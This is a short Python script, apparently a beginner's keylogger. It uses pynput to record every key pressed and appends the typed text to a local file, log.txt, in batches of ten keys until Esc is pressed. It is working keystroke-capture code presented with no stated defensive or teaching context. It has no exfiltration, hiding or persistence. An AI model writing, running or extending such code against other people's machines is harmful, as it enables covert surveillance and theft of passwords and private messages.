import pynput
from pynput.keyboard import Key, Listener

count = 0
keyCache = []

def on_press(key):
    global keyCache, count
    keyCache.append(key)
    count += 1

    if count >= 10:
        count = 0
        write_file(keyCache)
        keyCache = []

def write_file(keyCache):
    with open('log.txt', 'a') as f:
        for key in keyCache:
            k = str(key).replace("'","")  
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("enter") > 0:
                    f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        write_file(keyCache)
        return False

with Listener (on_press=on_press, on_release=on_release) as listener:
     listener.join()